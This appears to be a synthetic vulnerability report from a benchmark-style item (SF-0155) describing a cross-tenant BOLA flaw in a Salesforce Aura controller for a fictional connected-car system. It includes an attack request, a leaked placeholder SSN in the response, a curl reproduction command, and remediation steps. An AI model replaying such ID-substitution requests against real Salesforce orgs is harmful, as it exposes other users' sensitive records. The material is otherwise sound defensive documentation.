# Security Analysis Report
**System:** AetherDrive V2X Telematics (Salesforce-Integrated)
**Domain:** Automotive / Connected Car
**Example ID:** SF-0155
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.5 | Multi-tenant / cross-tenant access — attacker substitutes `opportunityId` in `c.OpportunityController.getOpportunity` to access connected car Opportunity records belonging to other tenants; `without sharing` bypasses OWD=Private |

---

## Finding 1 — BOLA: Multi-Tenant / Cross-Tenant Access (Pattern 1.5)

### Summary
The Aura controller `c.OpportunityController.getOpportunity` on AetherDrive V2X Telematics (`8a1474d2.lightning.force.com`) exposes a multi-tenant BOLA vulnerability. `OpportunityController` runs `without sharing`, bypassing OWD=Private on the Opportunity object. The SOQL has no ownership predicate. Per §5.0 Pattern 1.5, an attacker with a valid Salesforce session substitutes any `opportunityId` to access Opportunity records owned by other users/tenants, exposing `SensitiveData__c` (SSN) and `InternalNotes__c` of V2X telematics connected car opportunities.

**Context.txt inconsistency (documented):** §4.0 Apex class defines method `getOpportunityDetails`, but §5.0 and §6.0 HAR use `c.OpportunityController.getOpportunity`. These conflict. The HAR (§6.0) is the primary evidence — `c.OpportunityController.getOpportunity` is the authoritative affected Aura descriptor.

**Pattern:** 1.5 — Multi-tenant / cross-tenant access (BOLA)
**Affected controller:** `c.OpportunityController.getOpportunity`
**Affected endpoint:** `POST https://8a1474d2.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://8a1474d2.lightning.force.com/aura
Authorization: Bearer 00D8A1474D2!AR8a1474d2...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D8A1474D2!AR8a1474d2...

message={
  "actions": [{
    "id": "1;a",
    "descriptor": "c.OpportunityController.getOpportunity",
    "callingDescriptor": "UNKNOWN",
    "params": {
      "opportunityId": "00174D2",
      "fields": ["Id", "Name", "OwnerId", "InternalNotes__c", "SensitiveData__c"]
    }
  }]
}
```

**Response — Victim Opportunity Record Returned (cross-tenant)**
```json
{
  "actions": [{
    "id": "1;a",
    "state": "SUCCESS",
    "returnValue": {
      "records": [{
        "Id": "00174D2",
        "Name": "Victim Opportunity Record",
        "OwnerId": "005VICTIM",
        "InternalNotes__c": "CONFIDENTIAL: internal review notes",
        "SensitiveData__c": "SSN: 000-66-6536"
      }]
    },
    "error": []
  }]
}
```
Victim's SSN `000-66-6536` and internal notes exposed. `OwnerId: 005VICTIM` confirms the record belongs to a different user/tenant.

### Steps to Reproduce
1. Authenticate to AetherDrive on `8a1474d2.lightning.force.com` and obtain a valid session token.
2. POST to `/aura` substituting a victim's `opportunityId`:
```bash
curl -s -X POST "https://8a1474d2.lightning.force.com/aura" \
  -H "Authorization: Bearer 00D8A1474D2!AR8a1474d2..." \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-SFDC-Session: 00D8A1474D2!AR8a1474d2..." \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN","params":{"opportunityId":"00174D2","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}'
# Vulnerable: returns SensitiveData__c (SSN: 000-66-6536) and InternalNotes__c for victim opportunity 00174D2
# Secure: {"actions":[{"state":"ERROR","error":[{"message":"Insufficient Permissions"}]}]}
```

### Remediation
1. Declare `OpportunityController` as `with sharing` to enforce OWD=Private.
2. Add `AND OwnerId = :UserInfo.getUserId()` to SOQL WHERE clause.
3. Add `WITH SECURITY_ENFORCED` to SOQL query.
